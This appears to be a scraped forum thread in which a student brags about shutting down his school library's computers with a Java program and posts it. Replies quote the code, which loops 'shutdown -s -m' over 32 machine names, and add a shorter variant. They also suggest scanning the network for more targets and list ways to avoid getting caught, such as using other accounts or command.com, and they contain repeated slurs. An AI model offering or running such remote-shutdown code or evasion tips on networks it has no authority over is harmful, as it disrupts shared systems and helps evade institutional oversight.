channel.title: [Java] Shutdown thingy
channel.description:
I decided to make my last time in the library fun by shutting down every computer on the network :)
Im banned now and stood down from school, but I wrote this in 5 minutes at lunch time then ran it
http://pastebin.com/sdNQyva7
I know its shit. I'm nooby but I am going to use it for other things now :D
Feedback plz

item.title: [Java] Shutdown thingy
item.dc:creator: @dain_bramage dain bramage
item.description:
@dain_bramage wrote:

[quote=“ytuio9`, post:18, topic:420424”][quote author=dain bramage link=topic=522972.msg3806199#msg3806199 date=1320486892]
The following things are retarded:

[ul][li]Your Java conventions.[/li]
[li]The fact that you’re using a command which can be executed simply by opening command prompt.[/li]
[li]If command prompt is blocked at your school, you’re retarded for not using ‘command.com’ in a batch file.[/li]
[li]Your system admins are retarded for allowing anyone to execute the shutdown command.[/li]
[li]You’re retarded for thinking this is a hack.[/li]
[li]You’re retarded for not using the student account, thus not getting you banned.[/li]
[li]You’re retarded for, if the student account is blocked, for not using the computer admin account (admin while not connected to the school network, then after logging in, reconnecting to the school network).[/li]
[li]You’re retarded for using a GUI for such a retardely simple program.[/li]
[li]You’re retarded for thinking that you’re sending a packet.[/li]
[li]You’re computer network is retarded, since this should only shutdown one computer.[/li]
[li]You’re retarded for checking if the loop number is larger then 32 when it cannot reach higher then 32.[/li]
[li]You’re retarded for not making everything static (which you could do if not using a GUI).[/li]
[li]You’re retarded for using Java for a program which is only compatible for windows in the first place.[/li]
[li]You’re retarded for getting caught.[/li][/ul]

[/quote]
The following things are retarded:

[ul][li]Your post[/li][/ul][/quote]
LOL.

[quote="-Nothing, post:17, topic:420424"][quote author=dain bramage link=topic=522972.msg3806199#msg3806199 date=1320486892]
The following things are retarded:

[ul][li]Your Java conventions.[/li]
[li]The fact that you’re using a command which can be executed simply by opening command prompt.[/li]
[li]If command prompt is blocked at your school, you’re retarded for not using ‘command.com’ in a batch file.[/li]
[li]Your system admins are retarded for allowing anyone to execute the shutdown command.[/li]
[li]You’re retarded for thinking this is a hack.[/li]
[li]You’re retarded for not using the student account, thus not getting you banned.[/li]
[li]You’re retarded for, if the student account is blocked, for not using the computer admin account (admin while not connected to the school network, then after logging in, reconnecting to the school network).[/li]
[li]You’re retarded for using a GUI for such a retardely simple program.[/li]
[li]You’re retarded for thinking that you’re sending a packet.[/li]
[li]You’re computer network is retarded, since this should only shutdown one computer.[/li]
[li]You’re retarded for checking if the loop number is larger then 32 when it cannot reach higher then 32.[/li]
[li]You’re retarded for not making everything static (which you could do if not using a GUI).[/li]
[li]You’re retarded for using Java for a program which is only compatible for windows in the first place.[/li]
[li]You’re retarded for getting caught.[/li][/ul]

[/quote]
Why did you bother writing all that?[/quote]
Because I can.

Read full topic

I don’t understand how it will shutdown other computers.

“shutdown -s -m” thats what makes it shut down

item.title: [Java] Shutdown thingy
item.dc:creator: @X_Entinity_X X Entinity X
item.description:
@X_Entinity_X wrote:

[quote=“whattehp406, post:10, topic:420424”][quote author=X Entinity X link=topic=522972.msg3804762#msg3804762 date=1320358413]
I made one in a minute ;). Doesn’t knock off multiple computers though (I don’t think).

[code]import javax.swing.JOptionPane;
public class Hack{
public static void main(String[] args){
try{
Runtime rt = Runtime.getRuntime();
Process pr = rt.exec(“cmd /c shutdown -s”);
} catch (Exception ew){
JOptionPane.showMessageDialog(null, ew.toString());
ew.printStackTrace();
}
}
}

[/code]
[/quote]That will shut down your own computer…
but perhaps you could make java scan the other computer wich are in the network area your computer is in add them into a list and then start executing the command over and over again with -m \computername1,2,3 behind it[/quote]

Yes, I know that; what I said…

Read full topic

Explain how it’s scanning the network, as i see it (could be wrong) it will only shutdown computers with name URLC1 - URLC32

Unless all the computers are strung from one desktop this only shuts down a single computer, not to mention the code is beyond horrible.

Read full topic

item.title: [Java] Shutdown thingy
item.dc:creator: @zyle1992 Zymus
item.description:
@zyle1992 wrote:

Let’s take a look at this code:

import java.io.IOException;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
/**
 * Shutdown class
 * @author Aidan
 * @param Shutdown() - Called instead of using main(argument)
 * Used for shutting down ALL Upper riccarton library computers
 **/
   
public class Shutdown {  
public void endPrompt(){
  JFrame frame = new JFrame("Notification");
  JLabel label  = new JLabel("Computers shutdown");
  label.setVerticalTextPosition(JLabel.BOTTOM);
label.setHorizontalTextPosition(JLabel.CENTER);
  frame.add(label);
  frame.setSize(400, 400);
  frame.setVisible(true);
  frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
  }
  public int z;
    public Shutdown() {
        try { 
		for(int i = 0; 0 < 32; i++){
			if(i > 32){
			if(z == 0){ //Stops spamming the endPrompt interface :)
			endPrompt();
			z++;
			}
			} else {			
            String command = "shutdown -s -m \\URLC"+i;
            Process process = Runtime.getRuntime().exec(command);  
            System.out.println("Sending packet to URLC"+i);
			}
		}
        } catch (IOException e) {  
            System.err.println(e);  
        }  
    }  
   
    public static void main(String[] args) {  
        new Shutdown();  
    }  
}

First of all, it looks like crap. So let’s clean it up a bit.

import java.io.IOException;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;

/**
 * Shutdown class
 * @author Aidan
 * @param Shutdown() - Called instead of using main(argument)
 * Used for shutting down ALL Upper riccarton library computers
 **/

public class Shutdown {
	public void endPrompt() {
        JFrame frame = new JFrame("Notification");
        JLabel label = new JLabel("Computers shutdown");
        label.setVerticalTextPosition(JLabel.BOTTOM);
        label.setHorizontalTextPosition(JLabel.CENTER);
        frame.add(label);
        frame.setSize(400, 400);
        frame.setVisible(true);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    public int z;

    public Shutdown() {
        try {
            for (int i = 0; 0 < 32; i++) {
                if (i > 32) {
                    if (z == 0) { //Stops spamming the endPrompt interface :)
                        endPrompt();
                        z++;
                    }
                } else {
                    String command = "shutdown -s -m \\URLC" + i;
                    Process process = Runtime.getRuntime().exec(command);
                    System.out.println("Sending packet to URLC" + i);
                }
            }
        } catch (IOException e) {
            System.err.println(e);
        }
    }

    public static void main(String[] args) {
        new Shutdown();
    }
}

Alright, now it’s readable.

import java.io.IOException;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;

You’re importing the AWT packages, and never using them.

public void endPrompt() {
    JFrame frame = new JFrame("Notification");
    JLabel label = new JLabel("Computers shutdown");
    label.setVerticalTextPosition(JLabel.BOTTOM);
    label.setHorizontalTextPosition(JLabel.CENTER);
    frame.add(label);
    frame.setSize(400, 400);
    frame.setVisible(true);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
}

Nothing “bad” here. Although, it would have been much more “annoying” to use a Modal JDialogBox.

public int z;

Poor conventions. Your variables should be easily identified by their name.

for (int i = 0; 0 < 32; i++) {
    if (i > 32) {
        if (z == 0) {
            endPrompt();
            z++;
        }
    } else {
        String command = "shutdown -s -m \\URLC" + i;
        Process process = Runtime.getRuntime().exec(command);
        System.out.println("Sending packet to URLC" + i);
    }
}

What. The. Fuck. There is so much wrong with this, I can’t even get my head around it. And if the network admins allow the shutdown command without administrative privileges, then they’re as stupid as this code.

Read full topic
